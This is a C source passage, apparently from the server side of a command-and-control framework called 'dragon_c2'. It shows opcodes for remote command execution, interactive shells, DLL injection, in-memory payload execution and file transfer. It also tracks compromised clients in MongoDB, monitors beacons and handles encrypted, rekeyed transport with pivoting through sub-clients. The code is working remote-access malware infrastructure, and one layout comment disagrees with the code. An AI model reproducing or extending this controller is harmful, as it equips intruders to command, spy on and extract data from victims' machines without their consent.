#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <pthread.h>
#include <openssl/sha.h>
#include <string.h>
#include <arpa/inet.h>
#include <mongoc/mongoc.h>
#include <time.h>
#include <termios.h>
#include <errno.h>
#include <stdatomic.h>
#include <signal.h>
#include <readline/readline.h>
#include <readline/history.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "crypto_dragon.h"
#include "transport.h"
#include "malleable_profile.h"
#include <sodium.h>

#define MAX 2048
#define MAX_CLIENTS 100
#define ID_LEN 41
#define END_MARKER "__SHELL_END__"
#define MARKER_LEN (sizeof(END_MARKER)-1)
#define SHELL_QUEUE_SIZE 32
#define FILE_CHUNK_SIZE 1900

static malleable_profile_t g_profile;

static uint8_t server_priv[32];

/* =========================================================================
 * Data structures
 * ====================================================================== */

enum PacketOpcode {
    OPCODE_INIT = 0x00,
    OPCODE_BEACON = 0x01,
    OPCODE_EXEC_CMD = 0x02,
    OPCODE_SHELL_START = 0x03,
    OPCODE_DISCONNECT = 0x04,
    OPCODE_SHELL_DATA  = 0x05,
    OPCODE_SHELL_END   = 0x06,
    OPCODE_DLL_INJECT = 0x07,
    OPCODE_START_DLL_TRANSFER = 0x08,
    OPCODE_DLL_CHUNK = 0x09,
    OPCODE_END_DLL_TRANSFER = 0x0A,
    OPCODE_START_LISTENER = 0x0B,
    OPCODE_STOP_LISTENER = 0x0C,
    OPCODE_REG_NEW_CLIENT = 0x0D,
    OPCODE_REQ_LISTENERS  = 0x0E,
    OPCODE_REQ_ROUTES     = 0x0F,
    OPCODE_HANDSHAKE_PUBKEY = 0x10,
    OPCODE_HANDSHAKE_ACK = 0x11,
    OPCODE_CLIENT_ID_ASSIGN = 0x12,
    OPCODE_CLIENT_HANDSHAKE = 0x13,
    OPCODE_FILE_DOWNLOAD_REQ   = 0x14,
    OPCODE_FILE_DOWNLOAD_CHUNK = 0x15,
    OPCODE_FILE_DOWNLOAD_END   = 0x16,
    OPCODE_FILE_UPLOAD_START = 0x17,
    OPCODE_FILE_UPLOAD_CHUNK = 0x18, 
    OPCODE_FILE_UPLOAD_END = 0x19,
    OPCODE_FILE_ACK = 0x1A,
    OPCODE_EXEC_MEM_START = 0x1B,
    OPCODE_EXEC_MEM_CHUNK = 0x1C,
    OPCODE_EXEC_MEM_ARGS  = 0x1D,
    OPCODE_LISTENER_ACK = 0x1E
};

static volatile sig_atomic_t shell_got_sigint = 0;

/* =========================================================================
 * shell_handle_sigint
 *
 * Catches Ctrl+C during shell mode. Sets a flag instead of killing
 * the server process.
 * ====================================================================== */
void shell_handle_sigint(int signo) {
    shell_got_sigint = 1;
}

typedef struct {
    char opCode[6];
    uint16_t payload_size;
    uint8_t target_level;
    char target_id[ID_LEN];
    char payload[1998];
} PACKET_DRAGON;

typedef struct {
    PACKET_DRAGON   pkts[SHELL_QUEUE_SIZE];
    int             head, tail, count;
    pthread_mutex_t mu;
    pthread_cond_t  not_empty;
} ShellQueue;

typedef struct RemoteListener {
    char name[32];
    int port;
    char transport[16];
    malleable_profile_t profile;
    struct RemoteListener *next;
} RemoteListener;

typedef struct {
    char *id;
    char father[ID_LEN];
    char child[ID_LEN];
    transport_t      *trans;
    transport_conn_t *conn;
    struct sockaddr_in address;
    int level;
    char listener_name[32];
    char *status;
    char *test;
    time_t last_beacon;
    _Atomic int in_shell;
    uint8_t key_tx[KEY_LEN];
    uint8_t iv_tx[NONCE_LEN];
    uint8_t ck_tx[KEY_LEN];
    dr_ctr_t tx_ctr;
    uint64_t tx_epoch;
    uint8_t key_rx[KEY_LEN];
    uint8_t iv_rx[NONCE_LEN];
    uint8_t ck_rx[KEY_LEN];
    uint64_t rx_epoch;
    uint64_t last_rx_ctr;
    
    dr_ctr_t shell_ctr64_rx;
    dr_ctr_t shell_ctr64_tx;
    pthread_mutex_t crypto_mu;

    PACKET_DRAGON  shell_pkt;
    volatile int   shell_pkt_ready;
    pthread_mutex_t shell_pkt_mu;
    pthread_cond_t  shell_pkt_cond;
    ShellQueue shell_q;
    /*downloads parts*/
    FILE *xfer_dl_fp;
    char xfer_dl_local[512];
    uint64_t xfer_dl_bytes;
    int xfer_dl_active;

    malleable_profile_t profile;
    int profile_received;
    int beacon_timeout;
    RemoteListener *remote_listeners;
} CLIENT;

CLIENT* clients[MAX_CLIENTS];
pthread_mutex_t clients_collection_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t g_send_mu = PTHREAD_MUTEX_INITIALIZER;

/* =========================================================================
 * Pending query
 * ====================================================================== */

typedef enum { REQ_LISTENERS, REQ_ROUTES } QueryType;

typedef struct PendingQuery {
    char client_id[ID_LEN];
    QueryType type;
    char *buffer;
    size_t used;
    size_t cap;
    struct PendingQuery *next;
} PendingQuery;

static PendingQuery *pending_head = NULL;
static pthread_mutex_t pending_mutex = PTHREAD_MUTEX_INITIALIZER;

/* =========================================================================
 * DB
 * ====================================================================== */

pthread_mutex_t db_collection_mutex = PTHREAD_MUTEX_INITIALIZER;
const char *uri_string = "mongodb://localhost:27017/";
mongoc_uri_t *uri;
mongoc_client_t *client_db;
bson_error_t error;
mongoc_collection_t *collection;

/* =========================================================================
 * Global listeners struct and functions 
 *
 * ====================================================================== */

typedef struct GlobalListener {
    char name[32];
    int port;
    char transport[16];
    int client_id;        
    malleable_profile_t profile;
    struct GlobalListener *next;
} GlobalListener;

GlobalListener *g_all_listeners = NULL;
pthread_mutex_t g_listener_registry_mutex = PTHREAD_MUTEX_INITIALIZER;

void registry_add_listener(const char *name, int port, const char *transport, int client_id, const malleable_profile_t *prof) {
    pthread_mutex_lock(&g_listener_registry_mutex);
    
    GlobalListener *gl = malloc(sizeof(GlobalListener));
    snprintf(gl->name, sizeof(gl->name), "%s", name);
    gl->port = port;
    snprintf(gl->transport, sizeof(gl->transport), "%s", transport);
    gl->client_id = client_id;
    if (prof) gl->profile = *prof;
    else memset(&gl->profile, 0, sizeof(gl->profile));
    
    gl->next = g_all_listeners;
    g_all_listeners = gl;
    
    pthread_mutex_unlock(&g_listener_registry_mutex);
}

void registry_remove_listener(const char *name) {
    pthread_mutex_lock(&g_listener_registry_mutex);
    
    GlobalListener **pp = &g_all_listeners;
    while (*pp) {
        if (strcmp((*pp)->name, name) == 0) {
            GlobalListener *del = *pp;
            *pp = del->next;
            free(del);
            pthread_mutex_unlock(&g_listener_registry_mutex);
            return;
        }
        pp = &(*pp)->next;
    }
    
    pthread_mutex_unlock(&g_listener_registry_mutex);
}

void registry_remove_all_for_client(int client_id) {
    pthread_mutex_lock(&g_listener_registry_mutex);
    
    GlobalListener **pp = &g_all_listeners;
    while (*pp) {
        if ((*pp)->client_id == client_id) {
            GlobalListener *del = *pp;
            *pp = del->next;
            free(del);
        } else {
            pp = &(*pp)->next;
        }
    }
    
    pthread_mutex_unlock(&g_listener_registry_mutex);
}

int registry_name_exists(const char *name) {
    pthread_mutex_lock(&g_listener_registry_mutex);
    
    GlobalListener *gl = g_all_listeners;
    while (gl) {
        if (strcmp(gl->name, name) == 0) {
            pthread_mutex_unlock(&g_listener_registry_mutex);
            return 1;
        }
        gl = gl->next;
    }
    
    pthread_mutex_unlock(&g_listener_registry_mutex);
    return 0;
}

void registry_list_all() {
    pthread_mutex_lock(&g_listener_registry_mutex);
    
    printf("\n=== All Listeners ===\n");
    GlobalListener *gl = g_all_listeners;
    if (!gl) {
        printf("  (none)\n");
    }
    while (gl) {
        if (gl->client_id == -1)
            printf("  \"%s\" [%s] port %d (server)\n", gl->name, gl->transport, gl->port);
        else
            printf("  \"%s\" [%s] port %d (client %d)\n", gl->name, gl->transport, gl->port, gl->client_id);
        gl = gl->next;
    }
    printf("=====================\n\n");
    
    pthread_mutex_unlock(&g_listener_registry_mutex);
}

/* =========================================================================
 * list_clients
 *
 * Prints all connected clients: ID, level, father, status, transport,
 * and IP:port. Locks clients_collection_mutex.
 * ====================================================================== */
void list_clients() {
    pthread_mutex_lock(&clients_collection_mutex);
    printf("\n[CLIENTS ONLINE]\n");
    for (int i = 0; i < MAX_CLIENTS; ++i) {
        if (clients[i] != NULL && clients[i]->status != NULL && strcmp(clients[i]->status, "active") == 0) {
            time_t now = time(NULL);
            double ago = difftime(now, clients[i]->last_beacon);
            printf("Slot: %d\n", i);
            printf("  ID: %s\n", clients[i]->id ? clients[i]->id : "N/A");
            printf("  Father: %s\n", clients[i]->father);
            printf("  Level: %d\n", clients[i]->level);
            printf("  Transport: %s\n", clients[i]->trans ? clients[i]->trans->name : "N/A");
            printf("  IP: %s\n", inet_ntoa(clients[i]->address.sin_addr));
            printf("  Port: %d\n", ntohs(clients[i]->address.sin_port));
            printf("  Last Beacon: %.0fs ago\n", ago);
            printf("  Status: %s\n", clients[i]->status);
            printf("-----------------------------------\n");
        }
    }
    pthread_mutex_unlock(&clients_collection_mutex);
}

/* =========================================================================
 * set_mongodb_connection
 *
 * Connects to MongoDB on localhost:27017. Opens "dragon_c2" database,
 * "clients" collection. Call once at startup.
 * ====================================================================== */
int set_mongodb_connection() {
    mongoc_init();
    uri = mongoc_uri_new_with_error(uri_string, &error);
    if (!uri) {
        fprintf(stderr, "failed to parse URI: %s\nerror: %s\n",
                uri_string, error.message);
        return EXIT_FAILURE;
    }
    client_db = mongoc_client_new_from_uri(uri);
    if (!client_db) return EXIT_FAILURE;
    mongoc_client_set_appname(client_db, "dragon_c2");
    collection = mongoc_client_get_collection(client_db,
                                               "Clients_db",
                                               "Clients_collection");
    if (!collection) {
        perror("Error in collection\n");
        mongoc_client_destroy(client_db);
        mongoc_cleanup();
        return 1;
    }
    return EXIT_SUCCESS;
}

/* =========================================================================
 * destroy_db_connection
 *
 * Frees all MongoDB resources. Call once at shutdown.
 * ====================================================================== */
int destroy_db_connection() {
    pthread_mutex_lock(&db_collection_mutex);
    mongoc_collection_destroy(collection);
    pthread_mutex_unlock(&db_collection_mutex);
    mongoc_uri_destroy(uri);
    mongoc_client_destroy(client_db);
    mongoc_cleanup();
    return EXIT_SUCCESS;
}

/* =========================================================================
 * insert_into_db
 *
 * Inserts a new client into MongoDB. Saves id, father, child, transport,
 * address, level, status. Returns 0 on success, 1 on failure.
 * ====================================================================== */
int insert_into_db(CLIENT *new_client) {
    bson_t *doc = bson_new();
    BSON_APPEND_UTF8(doc, "id", new_client->id);
    BSON_APPEND_UTF8(doc, "father", new_client->father);
    BSON_APPEND_UTF8(doc, "child", new_client->child);
    if (new_client->trans && new_client->trans->name)
        BSON_APPEND_UTF8(doc, "transport", new_client->trans->name);
    bson_t address;
    bson_init(&address);
    char ip[INET_ADDRSTRLEN];
    if (!inet_ntop(AF_INET, &(new_client->address.sin_addr),
                   ip, INET_ADDRSTRLEN)) {
        perror("Error ntop ip\n");
        bson_destroy(doc);
        return 1;
    }
    BSON_APPEND_UTF8(&address, "ip", ip);
    BSON_APPEND_INT32(&address, "port",
                      ntohs(new_client->address.sin_port));
    BSON_APPEND_DOCUMENT(doc, "address", &address);
    BSON_APPEND_INT32(doc, "level", new_client->level);
    BSON_APPEND_UTF8(doc, "status", new_client->status);
    BSON_APPEND_UTF8(doc, "test", "OLD");
    pthread_mutex_lock(&db_collection_mutex);
    if (!mongoc_collection_insert_one(collection, doc,
                                       NULL, NULL, &error)) {
        perror("Error inserting new client in db\n");
        pthread_mutex_unlock(&db_collection_mutex);
        bson_destroy(doc);
        return 1;
    } else {
        printf("The new client inserted in the db\n");
    }
    pthread_mutex_unlock(&db_collection_mutex);
    bson_destroy(doc);
    return 0;
}

/* =========================================================================
 * get_client_by_id
 *
 * Looks up a client in MongoDB by ID. Returns the BSON document
 * or NULL if not found.
 * ====================================================================== */
const bson_t *get_client_by_id(char *id_client) {
    bson_t *query = bson_new();
    BSON_APPEND_UTF8(query, "id", id_client);
    pthread_mutex_lock(&db_collection_mutex);
    mongoc_cursor_t *cursor = mongoc_collection_find_with_opts(
        collection, query, NULL, NULL);
    pthread_mutex_unlock(&db_collection_mutex);
    const bson_t *doc = NULL;
    if (mongoc_cursor_next(cursor, &doc)) {
        bson_destroy(query);
        mongoc_cursor_destroy(cursor);
        return doc;
    } else {
        printf("No client found with id %s\n", id_client);
        bson_destroy(query);
        mongoc_cursor_destroy(cursor);
        return doc;
    }
}

/* =========================================================================
 * get_client_from_document
 *
 * Fills a CLIENT struct from a MongoDB BSON document. Used when a
 * known client reconnects.
 * ====================================================================== */
void get_client_from_document(const bson_t *doc, CLIENT *client) {
    if (!doc) { printf("Document is empty\n"); return; }
    bson_iter_t iter;
    if (bson_iter_init(&iter, doc)) {
        if (bson_iter_find(&iter, "id"))
            client->id = (char*)bson_iter_utf8(&iter, NULL);
        if (bson_iter_find(&iter, "father")) {
            const char *val = bson_iter_utf8(&iter, NULL);
            strncpy(client->father, val, ID_LEN - 1);
            client->father[ID_LEN-1] = '\0';
        }
        if (bson_iter_find(&iter, "child")) {
            const char *val = bson_iter_utf8(&iter, NULL);
            strncpy(client->child, val, ID_LEN - 1);
            client->child[ID_LEN-1] = '\0';
        }
        if (bson_iter_find(&iter, "level"))
            client->level = bson_iter_int32(&iter);
        if (bson_iter_find(&iter, "status"))
            client->status = (char*)bson_iter_utf8(&iter, NULL);
        if (bson_iter_find(&iter, "test"))
            client->test = (char*)bson_iter_utf8(&iter, NULL);
    } else {
        printf("Bson iter init failed\n");
    }
}

/* =========================================================================
 * Pending query functions
 * ====================================================================== */

 /* =========================================================================
 * create_pending_query
 *
 * Creates a buffer to collect fragmented responses from a client.
 * Used by listlisteners and listroutes commands.
 * ====================================================================== */
static void create_pending_query(const char *client_id, QueryType type) {
    PendingQuery *pq = malloc(sizeof(PendingQuery));
    if (!pq) return;
    strncpy(pq->client_id, client_id, ID_LEN - 1);
    pq->client_id[ID_LEN - 1] = '\0';
    pq->type = type;
    pq->cap  = 4096;
    pq->used = 0;
    pq->buffer = malloc(pq->cap);
    if (!pq->buffer) { free(pq); return; }
    pq->buffer[0] = '\0';
    pq->next = NULL;
    pthread_mutex_lock(&pending_mutex);
    pq->next = pending_head;
    pending_head = pq;
    pthread_mutex_unlock(&pending_mutex);
}

/* =========================================================================
 * find_pending_query
 *
 * Finds a pending query by client ID and type. Returns NULL if not found.
 * ====================================================================== */
static PendingQuery *find_pending_query(const char *client_id,
                                         QueryType type) {
    pthread_mutex_lock(&pending_mutex);
    PendingQuery *cur = pending_head;
    while (cur) {
        if (cur->type == type
            && strcmp(cur->client_id, client_id) == 0) {
            pthread_mutex_unlock(&pending_mutex);
            return cur;
        }
        cur = cur->next;
    }
    pthread_mutex_unlock(&pending_mutex);
    return NULL;
}

/* =========================================================================
 * remove_pending_query
 *
 * Removes and frees a pending query from the list.
 * ====================================================================== */
static void remove_pending_query(PendingQuery *pq) {
    pthread_mutex_lock(&pending_mutex);
    PendingQuery **ind = &pending_head;
    while (*ind) {
        if (*ind == pq) { *ind = pq->next; break; }
        ind = &((*ind)->next);
    }
    pthread_mutex_unlock(&pending_mutex);
    free(pq->buffer);
    free(pq);
}

/* =========================================================================
 * return_client_by_id
 *
 * Finds a CLIENT in the global clients[] array by ID.
 * Returns the pointer or NULL. Locks clients_collection_mutex.
 * ====================================================================== */
CLIENT* return_client_by_id(const char *client_id) {
    CLIENT *result = NULL;
    pthread_mutex_lock(&clients_collection_mutex);
    for (int i = 0; i < MAX_CLIENTS; ++i) {
        if (clients[i] &&
            clients[i]->status &&
            strcmp(clients[i]->status, "active") == 0 &&
            clients[i]->id &&
            strcmp(clients[i]->id, client_id) == 0) {
            result = clients[i];
            break;
        }
    }
    pthread_mutex_unlock(&clients_collection_mutex);
    return result;
}

/* =========================================================================
 * Beacon placeholder
 * ====================================================================== */

#define BEACON_TIMEOUT   120
#define CHECK_INTERVAL    30

static void free_remote_listeners(RemoteListener *head);
void *check_inactive_client(void *args) {
    (void)args;
    while (1) {
        sleep(CHECK_INTERVAL);
        time_t now = time(NULL);

        pthread_mutex_lock(&clients_collection_mutex);
        for (int i = 0; i < MAX_CLIENTS; i++) {
            if (!clients[i] || !clients[i]->status)
                continue;
            if (strcmp(clients[i]->status, "active") != 0) {
                /* cleanup dead clients older than 2*CHECK_INTERVAL */
                if (strcmp(clients[i]->status, "dead") == 0 &&
                    difftime(now, clients[i]->last_beacon) > CHECK_INTERVAL * 2) {
                    free_remote_listeners(clients[i]->remote_listeners);
                    if (clients[i]->id) free(clients[i]->id);
                    if (clients[i]->xfer_dl_fp) fclose(clients[i]->xfer_dl_fp);
                    free(clients[i]);
                    clients[i] = NULL;
                }
                continue;
            }

            double elapsed = difftime(now, clients[i]->last_beacon);
            int timeout = clients[i]->profile_received ? clients[i]->beacon_timeout : BEACON_TIMEOUT;
            if (elapsed > timeout) {
                printf("\n[BEACON] Client %s (level %d) inactive for %.0fs - marked dead\n",
                       clients[i]->id ? clients[i]->id : "?",
                       clients[i]->level, elapsed);
                clients[i]->status = "dead";
                printf("Dragon: ");
                fflush(stdout);
            }
        }
        pthread_mutex_unlock(&clients_collection_mutex);
    }
    return NULL;
}

/* =========================================================================
 * Packet serialize / deserialize
 * ====================================================================== */

/* =========================================================================
 * serialize_packet
 *
 * Converts a PACKET_DRAGON struct into a flat byte buffer for encryption.
 * Layout: [4B opcode][2B size][2B level][ID][payload]
 * ====================================================================== */
int serialize_packet(PACKET_DRAGON *p, char *buffer) {
    memcpy(buffer, p->opCode, 6);
    uint16_t payload_size_net = htons(p->payload_size);
    memcpy(buffer + 6, &payload_size_net, sizeof(payload_size_net));
    buffer[8] = p->target_level;
    memcpy(buffer + 9, p->target_id, ID_LEN);
    memcpy(buffer + 9 + ID_LEN, p->payload, p->payload_size);
    return 9 + ID_LEN + p->payload_size;
}

/* =========================================================================
 * deserialize_packet
 *
 * Converts a decrypted byte buffer back into a PACKET_DRAGON struct.
 * Inverse of serialize_packet.
 * ====================================================================== */
int deserialize_packet(PACKET_DRAGON *p, char *buffer) {
    memcpy(p->opCode, buffer, 6);
    uint16_t payload_size_net;
    memcpy(&payload_size_net, buffer + 6, sizeof(payload_size_net));
    p->payload_size = ntohs(payload_size_net);
    p->target_level = buffer[8];
    memcpy(p->target_id, buffer + 9, ID_LEN);
    p->target_id[ID_LEN - 1] = '\0';
    memset(p->payload, 0, sizeof(p->payload));
    if (p->payload_size > sizeof(p->payload)) return -1;
    if (p->payload_size > 0)
        memcpy(p->payload, buffer + 9 + ID_LEN, p->payload_size);
    p->payload[sizeof(p->payload) - 1] = '\0';
    return 0;
}

/* =========================================================================
 * send_packet / receive_packet
 * ====================================================================== */

/* =========================================================================
 * send_packet
 *
 * Encrypts and sends one PACKET_DRAGON. Serializes, encrypts with
 * ChaCha20-Poly1305, sends WIRE_FRAME_SIZE bytes. Counter increments
 * per frame.
 * ====================================================================== */
static int send_packet(transport_conn_t *conn, transport_t *trans,
                        uint8_t key[KEY_LEN],
                        const uint8_t iv[NONCE_LEN],
                        dr_ctr_t *ctr64, 
                        uint8_t ck[KEY_LEN],
                        uint64_t *epoch,
                        const PACKET_DRAGON *pkt)
{
    uint8_t plain[PLAINTEXT_SIZE] = {0};
    serialize_packet((PACKET_DRAGON *)pkt, (char *)plain);
    uint8_t wire[WIRE_FRAME_SIZE];
    pthread_mutex_lock(&g_send_mu);
    if (dragon_encrypt_frame(key, iv, ctr64, plain, wire) != 0) {
        pthread_mutex_unlock(&g_send_mu);
        return -1;
    }
    size_t sent = 0;
    while (sent < WIRE_FRAME_SIZE) {
        int n = trans->send(conn, wire + sent, WIRE_FRAME_SIZE - sent);
        if (n <= 0) {
            pthread_mutex_unlock(&g_send_mu);
            return -1;
        }
        sent += (size_t)n;
    }
    uint64_t cur = atomic_load(ctr64) - 1;
    uint64_t new_ep = cur / REKEY_INTERVAL;
    while (*epoch < new_ep) {
        dragon_rekey(key, ck);
        (*epoch)++;
    }
    pthread_mutex_unlock(&g_send_mu);
    return 0;
}

/* =========================================================================
 * decrypt_inner_payload_if_needed
 *
 * For sub-clients (level > 1), decrypts the inner encryption layer.
 * The outer layer is already removed by receive_packet. This exposes
 * the actual payload. Applies to: 0x01, 0x02, 0x05, 0x0E, 0x0F, 0x15,
 * 0x16, 0x1A. Returns 0 if ok or not needed, -1 on failure.
 * ====================================================================== */
static int decrypt_inner_payload_if_needed(PACKET_DRAGON *pkt)
{
    if (pkt->target_level <= 1) return 0;
    if (strcmp(pkt->opCode, "0x01") &&
        strcmp(pkt->opCode, "0x02") &&
        strcmp(pkt->opCode, "0x05") &&
        strcmp(pkt->opCode, "0x0E") &&
        strcmp(pkt->opCode, "0x0F") &&
        strcmp(pkt->opCode, "0x1E") &&
        strcmp(pkt->opCode, "0x1A") &&
        strcmp(pkt->opCode, "0x15") &&
        strcmp(pkt->opCode, "0x16"))
        return 0;
    CLIENT *sub = return_client_by_id(pkt->target_id);
    if (!sub) {
        fprintf(stderr, "[WARN] sub %s not found\n", pkt->target_id);
        return -1;
    }
    uint8_t clear[sizeof(pkt->payload)];
    uint16_t clear_len;
    int rc = dragon_decrypt_blob(sub->key_rx, sub->iv_rx,
                                  (uint8_t*)pkt->payload,
                                  pkt->payload_size,
                                  clear, &clear_len);
    if (rc != 0) return -1;
    memcpy(pkt->payload, clear, clear_len);
    pkt->payload_size = clear_len;
    return 0;
}

/* =========================================================================
 * receive_packet
 *
 * Reads FRAME_SIZE bytes, decrypts with ChaCha20-Poly1305, deserializes
 * into a PACKET_DRAGON. Returns 0 on success, -1 on failure.
 * ====================================================================== */
static int receive_packet(transport_conn_t *conn, transport_t *trans,
                          uint8_t key[KEY_LEN],
                          const uint8_t iv[NONCE_LEN],
                          uint8_t ck[KEY_LEN],
                          uint64_t *epoch,
                          uint64_t *last_ctr,
                          PACKET_DRAGON *p)
{
    uint8_t wire[WIRE_FRAME_SIZE];
    size_t received = 0;
    while (received < WIRE_FRAME_SIZE) {
        int n = trans->recv(conn, wire + received, WIRE_FRAME_SIZE - received);
        if (n <= 0) return -1;
        received += (size_t)n;
    }

    uint64_t wire_ctr;
    memcpy(&wire_ctr, wire, CTR_HDR);


    if (*last_ctr != UINT64_MAX && wire_ctr <= *last_ctr) {
        fprintf(stderr, "[REPLAY] counter %lu <= %lu\n",
                (unsigned long)wire_ctr, (unsigned long)*last_ctr);
        return -2;
    }

    uint8_t plain[PLAINTEXT_SIZE];
    if (dragon_decrypt_frame(key, iv, wire, plain, NULL) != 0) {
        fprintf(stderr, "[receive_packet] decrypt failed\n");
        return -1;
    }

    *last_ctr = wire_ctr;

    uint64_t new_ep = wire_ctr / REKEY_INTERVAL;
    while (*epoch < new_ep) {
        dragon_rekey(key, ck);
        (*epoch)++;
    }

    return deserialize_packet(p, (char *)plain);
}

/* =========================================================================
 * Misc helpers
 * ====================================================================== */

/* =========================================================================
* generate_sha1_id
*
* Makes a unique 40-char hex ID from SHA1(text + random salt).
* Output buffer must be at least 41 bytes.
* ====================================================================== */
void generate_sha1_id(char* text, char* output) {
    char input[256];
    char salt[17];
    /* Use libsodium for cryptographically random salt - srand/rand is not
       appropriate for security-sensitive identifiers. */
    uint8_t rand_bytes[8];
    randombytes_buf(rand_bytes, sizeof rand_bytes);
    snprintf(salt, sizeof salt,
             "%02x%02x%02x%02x%02x%02x%02x%02x",
             rand_bytes[0], rand_bytes[1], rand_bytes[2], rand_bytes[3],
             rand_bytes[4], rand_bytes[5], rand_bytes[6], rand_bytes[7]);
    snprintf(input, sizeof(input), "%s_%s", text, salt);
    unsigned char hash[SHA_DIGEST_LENGTH];
    SHA1((unsigned char *)input, strlen(input), hash);
    for (int i = 0; i < SHA_DIGEST_LENGTH; i++)
        sprintf(output + (i * 2), "%02x", hash[i]);
    output[40] = '\0';
}

typedef struct {
    CLIENT *client;
    struct ListeningSocket *listener;
} ConnectionData;

typedef struct ListeningSocket {
    char name[32];
    transport_t *trans;
    int handle;
    int port;
    pthread_t thread;
    int active;
    int occupied;
    struct ListeningSocket *next;
    CLIENT *client;
    malleable_profile_t profile;
} ListeningSocket;

ListeningSocket *head_listeners = NULL;
pthread_mutex_t list_mutex = PTHREAD_MUTEX_INITIALIZER;

/* =========================================================================
 * Output helpers
 * ====================================================================== */

static void print_filtered_output(const char *buf, size_t len,
                                   int level, CLIENT *sub)
{
    size_t i = 0;
    while (i < len) {
        size_t start = i;
        while (i < len && buf[i] != '\n' && buf[i] != '\r') ++i;
        size_t linelen = i - start;
        if (!memmem(buf + start, linelen, END_MARKER, MARKER_LEN))
            write(STDOUT_FILENO, buf + start, linelen);
        while (i < len && (buf[i] == '\n' || buf[i] == '\r')) {
            if (buf[i] == '\n') write(STDOUT_FILENO, "\n", 1);
            ++i;
        }
    }
}

/* =========================================================================
 * notify_parents_of_new_client
 *
 * Sends 0x0D upstream to tell all parent nodes that a new sub-client
 * joined. Payload: "port|father_id". Triggers route table updates
 * on every node in the chain.
 * ====================================================================== */
void notify_parents_of_new_client(CLIENT *via,
                                   const char* new_client_id,
                                   int level,
                                   const char* father_listener_name,
                                   const char* father_id)
{
    char payload[128];
    snprintf(payload, sizeof(payload), "%s|%s", father_listener_name, father_id);
    PACKET_DRAGON packet = {0};
    strcpy(packet.opCode, "0x0D");
    packet.payload_size = (uint16_t)strlen(payload);
    strncpy(packet.payload, payload, sizeof(packet.payload) - 1);
    packet.target_level = level;
    strncpy(packet.target_id, new_client_id, ID_LEN - 1);
    if (send_packet(via->conn, via->trans, via->key_tx, via->iv_tx, &via->tx_ctr, via->ck_tx, &via->tx_epoch, &packet) != 0)
        printf("Error notify clients for new client\n");
}

/* =========================================================================
 * Client list management
 * ====================================================================== */

/* =========================================================================
 * add_client
 *
 * Adds a CLIENT to the global clients[] array. Also updates the
 * father's child field. Locks clients_collection_mutex.
 * ====================================================================== */
static void add_client(CLIENT *c) {
    pthread_mutex_lock(&clients_collection_mutex);
    int i;
    for (i = 0; i < MAX_CLIENTS; ++i) {
        if (clients[i] == NULL || clients[i]->status == NULL
            || (strcmp(clients[i]->status, "active") != 0
                && clients[i]->level <= 1)) {
            clients[i] = c;
            clients[i]->status = "active";
            break;
        }
    }
    pthread_mutex_unlock(&clients_collection_mutex);
    if (i == MAX_CLIENTS) printf("Client list full!\n");
}

/* =========================================================================
 * send_req_listeners
 *
 * Sends 0x0E to a client asking for its listener list. Response comes
 * back as fragmented 0x0E packets collected by PendingQuery.
 * ====================================================================== */
static void send_req_listeners(int port, int level,
                                const char *client_id) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    while (curr) {
        if (curr->port == port && curr->occupied
            && curr->client != NULL) {
            PACKET_DRAGON req = {0};
            strcpy(req.opCode, "0x0E");
            req.target_level = level;
            strncpy(req.target_id, client_id, ID_LEN - 1);
            if (level > 1) {
                CLIENT *dst = return_client_by_id(client_id);
                if (!dst) {
                    printf("route unknown\n");
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                uint16_t blob_len = 0;
                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                            &dst->tx_ctr,
                                            (uint8_t*)req.payload, 0,
                                            (uint8_t*)&req.payload,
                                            &blob_len) != 0) {
                    printf("[ERROR] Payload encryption failed\n");
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                req.payload_size = blob_len;
            }
            if (send_packet(curr->client->conn, curr->client->trans, curr->client->key_tx, curr->client->iv_tx, &curr->client->tx_ctr, curr->client->ck_tx, &curr->client->tx_epoch, &req) == 0) {
                create_pending_query(client_id, REQ_LISTENERS);
                printf("Listeners list requested\n");
            } else {
                printf("Error sending listener request\n");
            }
            break;
        }
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * send_req_routes
 *
 * Sends 0x0F to a client asking for its routing table. Same mechanism
 * as send_req_listeners.
 * ====================================================================== */
static void send_req_routes(int port, int level,
                             const char *client_id) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    while (curr) {
        if (curr->port == port && curr->occupied
            && curr->client != NULL) {
            PACKET_DRAGON req = {0};
            strcpy(req.opCode, "0x0F");
            req.target_level = level;
            strncpy(req.target_id, client_id, ID_LEN - 1);
            if (level > 1) {
                CLIENT *dst = return_client_by_id(client_id);
                if (!dst) {
                    printf("route unknown\n");
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                uint16_t blob_len;
                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                            &dst->tx_ctr,
                                            (uint8_t*)req.payload,
                                            req.payload_size,
                                            (uint8_t*)req.payload,
                                            &blob_len) != 0) {
                    printf("payload encryption failed\n");
                }
                req.payload_size = blob_len;
            }
            if (send_packet(curr->client->conn, curr->client->trans,
                             curr->client->key_tx, curr->client->iv_tx, &curr->client->tx_ctr, curr->client->ck_tx,
                             &curr->client->tx_epoch, &req) == 0) {
                create_pending_query(client_id, REQ_ROUTES);
                printf("Routes list requested\n");
            } else {
                printf("Error sending routes request\n");
            }
            break;
        }
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * shell_q_init / shell_q_push / shell_q_pop
 *
 * Thread-safe queue for shell packets. handle_connection pushes,
 * interactive_shell pops. Pop blocks with timeout.
 * ====================================================================== */
void shell_q_init(ShellQueue *q) {
    memset(q, 0, sizeof(*q));
    pthread_mutex_init(&q->mu, NULL);
    pthread_cond_init(&q->not_empty, NULL);
}

void shell_q_push(ShellQueue *q, const PACKET_DRAGON *pkt) {
    pthread_mutex_lock(&q->mu);
    if (q->count < SHELL_QUEUE_SIZE) {
        memcpy(&q->pkts[q->tail], pkt, sizeof(*pkt));
        q->tail = (q->tail + 1) % SHELL_QUEUE_SIZE;
        q->count++;
        pthread_cond_signal(&q->not_empty);
    }
    pthread_mutex_unlock(&q->mu);
}

